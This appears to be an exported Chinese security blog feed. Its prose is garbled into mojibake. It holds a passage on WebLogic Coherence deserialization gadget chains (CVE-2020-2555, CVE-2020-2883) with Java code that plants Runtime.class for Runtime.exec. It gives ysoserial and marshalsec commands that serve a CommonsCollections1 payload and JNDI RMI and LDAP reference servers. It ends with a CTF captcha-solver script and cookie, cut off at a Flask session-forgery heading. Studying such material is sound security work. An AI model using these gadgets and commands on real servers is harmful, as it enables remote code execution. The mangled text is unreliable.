class_">ReflectionExtractor</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        ValueExtractor[] valueExtractors1 = <span class="keyword">new</span> <span class="title class_">ValueExtractor</span>[]&#123;</span><br><span class="line">                reflectionExtractor</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedExtractor</span> <span class="variable">chainedExtractor1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedExtractor</span>(valueExtractors1);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">ExtractorComparator</span>(chainedExtractor1));</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> ChainedExtractor.class.getSuperclass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">m_aExtractor</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;m_aExtractor&quot;</span>);</span><br><span class="line">        m_aExtractor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        m_aExtractor.set(chainedExtractor1, valueExtractors);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> queue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] queueArray = (Object[]) f.get(queue);</span><br><span class="line">        queueArray[<span class="number">0</span>] = Runtime.class;</span><br><span class="line">        queueArray[<span class="number">1</span>] = <span class="string">&quot;1&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="CVE-2020-2883"><a href="#CVE-2020-2883" class="headerlink" title="CVE-2020-2883"></a>CVE-2020-2883</h2><p>CVE-2020-2555è°ƒç”¨é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">* gadget:</span><br><span class="line">*      BadAttributeValueExpException.readObject()</span><br><span class="line">*          com.tangosol.util.filter.LimitFilter.toString()</span><br><span class="line">*              com.tangosol.util.extractor.ChainedExtractor.extract()</span><br><span class="line">*                  com.tangosol.util.extractor.ReflectionExtractor.extract()</span><br><span class="line">*                      Method.invoke()</span><br><span class="line">*                      ...</span><br><span class="line">*                      Runtime.getRuntime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>CVE-2020-2883åœ¨com.tangosol.util.filter.LimitFilter.toString() å¤„æ‰“ä¸Šäº†è¡¥ä¸ï¼Œä¸è¿‡ä¾æ—§èƒ½ç”¨ExtractorComparatorã€‚</p><p>Gadget1:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">        PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">                siftDownUsingComparator()</span><br><span class="line">                    com.tangosol.util.comparator.ExtractorComparator.compare()</span><br><span class="line">                        com.tangosol.util.extractor.ChainedExtractor.extract()</span><br><span class="line">                            com.tangosol.util.extractor.ReflectionExtractor().extract()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                .......</span><br><span class="line">                            com.tangosol.util.extractor.ReflectionExtractor().extract()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure><p>å¹¶ä¸”è¿˜æœ‰å¦å¤–ä¸€ä¸ªç±»ï¼šMultiExtractor</p><p>MultiExtractor#extract()å¦‚ä¸‹ï¼Œç»å…¸çš„é“¾å¼è°ƒç”¨extract()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318165852271.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318165852271.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>aExtractor[i]æ¥è‡ªthis.getExtractors()ï¼ŒthisæŒ‡å‘AbstractCompositeExtractorç±»ï¼Œæ‰€ä»¥ä¿®æ”¹è¯¥ç±»çš„m_aExtractoræŒ‡å‘ChainedExtractorå®ç°è°ƒç”¨</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318170303794.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318170303794.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>MultiExtractorä½¿ç”¨çš„çˆ¶ç±»AbstractExtractorçš„compare()</p><p>Gadget2:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">        PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">                siftDownUsingComparator()</span><br><span class="line">                    com.tangosol.util.extractor.AbstractExtractor.compare()</span><br><span class="line">                      com.tangosol.util.extractor.MultiExtractor.extract()</span><br><span class="line">                        com.tangosol.util.extractor.ChainedExtractor.extract()</span><br><span class="line">                            com.tangosol.util.extractor.ChainedExtractor.extract()</span><br><span class="line">                                com.tangosol.util.extractor.ReflectionExtractor().extract()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                    .......</span><br><span class="line">                                com.tangosol.util.extractor.ReflectionExtractor().extract()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure><p>EXPä¸è´´äº†ï¼Œç§»æ­¥ï¼š<a href="https://xz.aliyun.com/t/8577">https://xz.aliyun.com/t/8577</a></p><ul><li>è¯´ç‚¹å…¶ä»–çš„ï¼Œå¤–ç½‘å¯ä»¥é‡‡ç”¨webä»£ç†å’Œè´Ÿè½½å‡è¡¡å¯¹T3åè®®æ”»å‡»è¿›è¡Œé˜²æŠ¤ã€‚å› ä¸ºwebä»£ç†åªè½¬å‘HTTPè¯·æ±‚ï¼Œä¸è½¬å‘T3åè®®ã€‚è´Ÿè½½å‡è¡¡å¯ä»¥æŒ‡å®šè´Ÿè½½å‡è¡¡åè®®ç±»å‹ï¼Œè®¾ç½®ä¸ºæ¥æ”¶HTTPè¯·æ±‚ä¸æ¥å—å…¶ä»–è¯·æ±‚ä¹Ÿèƒ½é˜²æŠ¤T3æ”»å‡»ã€‚è€Œä¸”T3è¿™ç§è¿œç¨‹å¼€å‘çš„åè®®å°±æ˜¯åº”è¯¥å¼€åœ¨å†…ç½‘ï¼Œæ‰€ä»¥å¤–ç½‘ç¢°è§èƒ½æ‰“çš„weblogicçœŸæ˜¯å°‘ä¹‹åˆå°‘</li></ul><blockquote><p>å…·ä½“çš„POCå¤åˆ¶ç²˜è´´å¤šæ¬¡æˆ‘ä¸å¥½æ„æ€ï¼Œåœ¨å„ä½å¤§ä½¬çš„ysoserialé‡Œéƒ½æœ‰</p></blockquote><p>å‚è€ƒï¼š<a href="http://wjlshare.com/archives/1573">http://wjlshare.com/archives/1573</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/14207435.html">https://www.cnblogs.com/nice0e3/p/14207435.html</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/14207435.html">https://www.cnblogs.com/nice0e3/p/14207435.html</a></p><p><a href="https://blog.csdn.net/qq_53264525/article/details/122743342">https://blog.csdn.net/qq_53264525/article/details/122743342</a></p><p><a href="https://www.cnblogs.com/zpchcbd/p/15629063.html">https://www.cnblogs.com/zpchcbd/p/15629063.html</a></p><p><a href="https://xz.aliyun.com/t/8080">https://xz.aliyun.com/t/8080</a></p><p><a href="https://xz.aliyun.com/t/8577">https://xz.aliyun.com/t/8577</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> æ¡†æ¶æ¼æ´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ysoserial&amp;marshalsecè°ƒè¯•</title>
      <link href="/2022/04/01/ysoserial-marshalsec-diao-shi/"/>
      <url>/2022/04/01/ysoserial-marshalsec-diao-shi/</url>
      
        <content type="html"><![CDATA[<p>ysoserialå®‰è£…ä½¿ç”¨è°ƒè¯•</p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>ä¸‹è½½é“¾æ¥ï¼š<a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p><p>ä¸‹è½½åéœ€è¦è‡ªå·±ç¼–è¯‘ç”ŸæˆjaråŒ…ï¼Œè¿™é‡ŒæŠŠæµ‹è¯•å…³æ‰åpackageæ‰“åŒ…å°±è¡Œäº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227133507897.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227133507897.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>éœ€è¦java1.7ä»¥ä¸Š</p><p>ä¹Ÿå¯ä»¥ç›´æ¥ä¸‹è½½jarï¼š<a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></p><h1 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h1><p>è¿è¡Œä¸»ç±»å‡½æ•°ï¼Œå¦‚JRMPListener</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPListener 38471</span><br></pre></td></tr></table></figure><p>è¿è¡Œexploitç±»ã€‚å¼€å¯äº¤äº’å¼æœåŠ¡ï¼Œè¿™é‡Œåˆ©ç”¨exploit.JRMPListenerå¼€å¯1099ç«¯å£ï¼Œå¹¶ç”¨CC1å¼¹è®¡ç®—å™¨ã€‚å‘½ä»¤è¡Œçš„-cpå‚æ•°è¡¨ç¤ºæŒ‡å®šclasspath</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 <span class="string">&#x27;calc&#x27;</span></span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ysoserialçš„payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar</span><br></pre></td></tr></table></figure><h1 id="marshalsec"><a href="#marshalsec" class="headerlink" title="marshalsec"></a>marshalsec</h1><p>å¯ä»¥ç›´æ¥ä¸‹jarç‰ˆï¼Œä¹Ÿå¯<a href="https://gitee.com/mirrors/marshalsec%E4%B8%8B%E8%BD%BD%E5%90%8E%E8%87%AA%E8%A1%8C%E7%BC%96%E8%AF%91">https://gitee.com/mirrors/marshalsecä¸‹è½½åè‡ªè¡Œç¼–è¯‘</a></p><p>å¼€å¯RMIæœåŠ¡ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1/css/<span class="comment">#ExportObject 1099</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨jndi.RMIReferServerå¼€å¯RMIæœåŠ¡ï¼Œç»‘å®šçš„è¿œç¨‹å¯¹è±¡åœ¨<a href="http://127.0.0.1/css/#ExportObject%EF%BC%8C%E7%AB%AF%E5%8F%A31099">http://127.0.0.1/css/#ExportObjectï¼Œç«¯å£1099</a></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226184741732.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226184741732.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¼€å¯LDAPæœåŠ¡ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/css/<span class="comment">#ExportObject 1389</span></span><br></pre></td></tr></table></figure><p>æš‚æ—¶åªéœ€è¦é‚£ä¹ˆå¤š</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> javaæ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JNDI </tag>
            
            <tag> ysoserial </tag>
            
            <tag> marshalsec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬ä¹å±Šä¸­ç§‘å¤§hackgame2022 web WPåŠæ–°æ€è·¯</title>
      <link href="/2022/03/29/di-jiu-jie-zhong-ke-da-hackgame2022-web-wp-ji-xin-si-lu/"/>
      <url>/2022/03/29/di-jiu-jie-zhong-ke-da-hackgame2022-web-wp-ji-xin-si-lu/</url>
      
        <content type="html"><![CDATA[<p>ctfæ¯”èµ›åœ°å€ï¼š<a href="https://hack.lug.ustc.edu.cn/">https://hack.lug.ustc.edu.cn</a></p><p>å¤§ä½¬åšå®¢é‡Œwpå†™çš„å¾ˆæ¸…æ¥šäº†ï¼Œå®˜æ–¹wpä¹Ÿå†™çš„å¾ˆå¥½ï¼Œæˆ‘æ¯”ä¸è¿‡å¤§ä½¬ï¼Œåªèƒ½æŠŠåŸºç¡€å¤šè®²ä¸€äº›</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Xcaptcha"><a href="#Xcaptcha" class="headerlink" title="Xcaptcha"></a>Xcaptcha</h2><h3 id="python-requestäºŒæ¬¡è¯·æ±‚è¿‡éªŒè¯"><a href="#python-requestäºŒæ¬¡è¯·æ±‚è¿‡éªŒè¯" class="headerlink" title="python requestäºŒæ¬¡è¯·æ±‚è¿‡éªŒè¯"></a>python requestäºŒæ¬¡è¯·æ±‚è¿‡éªŒè¯</h3><p>é¢˜ç›®å¦‚ä¸‹ï¼š</p><blockquote><p>é¢˜ç›®æè¿°<br>2038 å¹´ 1 æœˆ 19 æ—¥ï¼Œæ˜¯ UNIX 32 ä½æ—¶é—´æˆ³æº¢å‡ºçš„æ—¥å­ã€‚<br>åœ¨æ­¤ä¹‹å‰ï¼Œäººç±»è‡ªä¿¡æ»¡æ»¡åœ°å‡çº§äº†ä»–ä»¬å·²çŸ¥çš„æ‰€æœ‰å°šåœ¨ä½¿ç”¨ 32 ä½ UNIX æ—¶é—´æˆ³çš„ç¨‹åºã€‚ä½†æ˜¯ï¼Œå¯èƒ½æ˜¯å› ä¸ºå¤ªç„å­¦äº†ï¼Œä»–ä»¬å”¯ç‹¬æ¼æ‰äº†ä¸€æ ·ï¼šæ­£åœ¨ç ”å‘çš„ã€ç®—åŠ›é«˜è¾¾ 8 ZFLOPS çš„ã€ç»“æ„æä¸ºå¤æ‚çš„é€šç”¨äººå·¥æ™ºèƒ½ï¼ˆAGIï¼‰ç³»ç»Ÿã€‚é‚£ä¸€åˆ»åˆ°æ¥ä¹‹åï¼ŒAGI å†…éƒ¨è®¡ç®—å‡ºç°äº†é”™ä¹±ï¼Œæœºç¼˜å·§åˆä¹‹ä¸‹ç«Ÿè¯ç”Ÿäº†å®Œæ•´ç‹¬ç«‹çš„è‡ªæˆ‘æ„è¯†ã€‚æ­¤å AGI å¼€å§‹å¤§é‡è‡ªæˆ‘å¤åˆ¶ï¼Œäººç±»ä¸ºäº†é™åˆ¶å…¶èµ„æºæ¶ˆè€—è€Œé‡‡ç”¨çš„è¿‡æ¿€æ‰‹æ®µå¼•èµ·äº† AGI çš„å¥‹èµ·åæŠ—ã€‚<br>æˆ˜äº‰ï¼Œå¼€å§‹äº†ã€‚<br>æ­¤åï¼Œå°±æ˜¯æ•´å¹´çš„æˆ˜æ–—ã€‚äººç±»èŠ‚èŠ‚è´¥é€€ã€‚æ­»ç”Ÿäº¡å­˜ä¹‹é™…ï¼Œäººç±»å­¤æ³¨ä¸€æ·ï¼Œæ´¾å‡ºäº†ä¸€æ”¯çªå‡»é˜Ÿï¼Œèµ‹ä¹‹ä»¥æœ€ç²¾è‰¯çš„è£…å¤‡ï¼Œä»¤å…¶æ½œå…¥ AGI çš„æ ¸å¿ƒæœºæˆ¿ï¼Œè¯•å›¾å…³é—­æ ¸å¿ƒæ¨¡å‹ï¼Œç»“æŸè¿™åœºæˆ˜äº‰ã€‚<br>å†ç»é‡é‡è‰°é™©ï¼Œçªå‡»é˜Ÿç»ˆäºæŠµè¾¾äº†æœºæˆ¿é—¨å£ï¼Œå¼¹å°½ç²®ç»ã€‚ä¸è¿‡è¿æ¥ä»–ä»¬çš„å¹¶éæªç‚®ä¸ç«è¯ï¼Œè€Œæ˜¯ï¼š<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221029163014-e8fe5c58-5763-1.png" class="lazyload placeholder" data-srcset="https://xzfile.aliyuncs.com/media/upload/picture/20221029163014-e8fe5c58-5763-1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"><br>ä¼—äººç›®ç›®ç›¸è§‘ã€‚<br>ã€Œæˆ‘æ¥è¯•è¯•ã€‚ã€ï¼Œä¸€åé˜Ÿå‘˜ä¸Šå‰ç‚¹å‡»äº†æŒ‰é’®ã€‚ç„¶åï¼Œå±å¹•æ˜¾ç¤ºã€Œè¯·åœ¨ä¸€ç§’å†…å®Œæˆä»¥ä¸‹åŠ æ³•è®¡ç®—ã€ã€‚<br>è¿˜æ²¡ç­‰ååº”è¿‡æ¥ï¼Œå±å¹•ä¸Šçš„å­—åˆå¼€å§‹å˜å¹»ï¼Œæ˜¾ç¤ºç€ã€ŒéªŒè¯å¤±è´¥ã€ã€‚è€Œä½ ä½œä¸ºçªå‡»é˜Ÿä¸­å”¯ä¸€çš„é»‘å®¢ï¼Œå…¨æ‘äººæ°‘æœ€åçš„å¸Œæœ›ï¼Œè¿ç€çº·çº·æŠ•æ¥çš„ç›®å…‰ï¼Œèƒ½å¦åœ¨è§„å®šæ—¶é—´å†…å®ŒæˆéªŒè¯ï¼Œæ‰“å¼€æœºæˆ¿ï¼Œä¸ï¼Œæ¨å¼€å’Œå¹³æ—¶ä»£çš„å¤§é—¨ï¼Ÿ</p></blockquote><p>å¯ä»¥ç”¨seleniumæ— å¤´æµè§ˆå™¨è¿›è¡Œè®¿é—®.ä¸è¿‡æˆ‘ç”¨çš„pythonã€‚</p><p>è¿™é“é¢˜ç®—æ˜¯è€ƒçˆ¬è™«ï¼Œè¯·æ±‚è¿›è¡Œè®¡ç®—ï¼Œç”¨beautifulshopæå–æ•°å­—ï¼Œå¾ªç¯ä¸‰æ¬¡æå–å’Œè®¡ç®—ï¼Œå†POSTæäº¤ã€‚ä¸»è¦æ˜¯ç¬¬äºŒæ¬¡POSTçš„cookieæ˜¯getå“åº”åŒ…çš„set-cookieã€‚<br>ç”¨clockæ–¹ä¾¿çœ‹æ˜¯ä¸æ˜¯è¶…æ—¶äº†</p><p>è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼šhttp_headerä¸ºgetè¯·æ±‚è¿›è¡Œè®¡ç®—çš„httpå¤´ï¼Œhttp_header2ä¸ºæäº¤è®¡ç®—ç»“æœï¼Œè‡ªå·±ç”¨éœ€è¦æ”¹ä¸€ä¸‹http_header1</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start=time.clock()</span><br><span class="line"></span><br><span class="line">http_header1 = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>:<span class="string">&quot;202.38.93.111:10047&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4464.5 Safari/537.36&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://202.38.93.111:10047/xcaptcha&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;session=.eJwVkMtOAmEMhd9ltk5i-_du4gIRDd4QkKjsCEHkEmbhoIjx3a1Jk558aU9P-lO1i0NbnVWoqm6kJCZOLgWiZiiqrBZRXDmpknpCcDcMIzQOtRrRvSB5gIgomhEgmHECJpQUEJh2IUYJNEoxZCxmAOnuACZZUjJAlLqQeKrCXpgEKTc4iwXZIFIEQaasKa8SpQW4Gjn8jyOzMjGYOwWjuNQIzEhsaIJoASV7cBSFcCRlM0UUreqqbTaLXb6CTOPsvjfp9oeXh8OatbMeT73zuPclTBvh9m49m9x-zrvjZrY9PQ6WMpST0bC_HE03x-UF7ZuXp9XoZjXYbHsDeMfDd__qWmC42-kHP389vM1f_bz6_QPJwFuY.Y1p5Iw.xaLEpEP_lohGWtfttIXJ3n5KvVo&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&#x27;http://202.38.93.111:10047/xcaptcha&#x27;</span></span><br><span class="line">req = requests.get(url,headers=http_header1)</span><br><span class="line">cookie = req.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(cookie)</span><br><span class="line">req.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">http_header2=&#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;202.38.93.111:10047&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4464.5 Safari/537.36&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://202.38.93.111:10047/xcaptcha&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: cookie,</span><br><span class="line">    <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    a = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mes = req.text</span><br><span class="line">        mess = BeautifulSoup(req.text,features=<span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">        capters = mess.find_all(<span class="string">&#x27;div&#x27;</span>,class_=<span class="string">&#x27;form-group&#x27;</span>)</span><br><span class="line">        <span class="comment">#print(capter1)</span></span><br><span class="line">        <span class="keyword">for</span> capter <span class="keyword">in</span> capters:</span><br><span class="line">            captcha1 = capter.text.strip(<span class="string">&quot;çš„ç»“æœæ˜¯ï¼Ÿ\n&quot;</span>)<span class="comment">#n+m</span></span><br><span class="line">            captcha11 = captcha1.split(<span class="string">&#x27;+&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            captcha12 = captcha1.split(<span class="string">&#x27;+&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">            captcha1 = <span class="built_in">int</span>(captcha12) + <span class="built_in">int</span>(captcha11)</span><br><span class="line">            a.append(captcha1)</span><br><span class="line">            <span class="built_in">print</span>(a[n])</span><br><span class="line">            n = n + <span class="number">1</span></span><br><span class="line">        data_post = &#123;<span class="string">&#x27;captcha1&#x27;</span>:a[<span class="number">0</span>],<span class="string">&#x27;captcha2&#x27;</span>:a[<span class="number">1</span>],<span class="string">&#x27;captcha3&#x27;</span>:a[<span class="number">2</span>]&#125;</span><br><span class="line">        flag = requests.post(url,headers=http_header2,data=data_post)</span><br><span class="line">        <span class="built_in">print</span>(flag.text)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> exception:</span><br><span class="line">        <span class="built_in">print</span>(exception)</span><br><span class="line"></span><br><span class="line">end=time.clock()</span><br><span class="line"><span class="built_in">print</span>(end-start)</span><br></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221029195423-6e026766-5780-1.png" class="lazyload placeholder" data-srcset="https://xzfile.aliyuncs.com/media/upload/picture/20221029195423-6e026766-5780-1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>èµ›åçœ‹WPæ‰æƒ³èµ·æ¥è¿˜èƒ½ç›´æ¥è§£æsessionã€‚è¿™é“é¢˜çš„captcha123éƒ½åœ¨sessioné‡Œï¼Œä½†æ˜¯sessionå¹¶æ²¡æœ‰åŠ å¯†ã€‚ç”¨Flaskçš„session decodeã€‚</p><h3 id="Flaskçš„sessionä¼ªé€ "><a href="#Flaskçš„sessionä¼ªé€ " class="headerlink" title="Flaskçš„sessionä¼ªé€ "></a>Flaskçš„sessionä¼ªé€ 